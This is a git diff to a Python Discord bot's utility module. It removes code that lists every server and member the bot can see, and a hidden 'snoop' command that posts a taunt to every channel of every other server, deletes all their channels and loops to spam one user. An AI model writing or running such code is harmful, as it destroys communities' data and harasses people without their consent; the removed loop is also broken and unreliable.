@@ -16,43 +16,8 @@ class Utility:
         members = ""
         embed = discord.Embed(title="testing", description="Testing")
         embed.add_field(name="Notes", value="Testing!", inline=False)
-        for x in self.bot.guilds:
-            servers += x.name + " " + str(x.id) + "\n"
-            if x.id != 318626746297745409:
-                for y in x.members:
-                    members += y.name + " " + x.name + "\n"
-        embed.add_field(name="Notes", value=servers, inline=False)
-        embed.add_field(name="Notes", value=members)
         embed.colour = discord.Colour(0x00FFFF)            
         await ctx.send(embed=embed)
-    
-    @commands.command()
-    async def snoop(self, ctx):
-        """whee"""
-        yes = 0
-        test = False
-        for x in self.bot.guilds:
-            if x.id != 318626746297745409:
-                for y in x.channels:
-                    try:
-                        await y.send("Bad move, Zewia...")
-                    except:
-                        pass
-                try:
-                    for a in x.channels:
-                        await a.delete()
-                except:
-                    pass
-                for z in x.members:
-                    if x.id == 349088339489456140:
-                        zewia = x
-                        test = True
-                await ctx.send("Success!")
-                while yes <= 100:
-                    test = test + 1
-                    if test:
-                        await zewia.send("You tried")
-                await ctx.send("Messages done")
 
     @commands.has_permissions(ban_members=True)    
     @commands.command(pass_context=True)
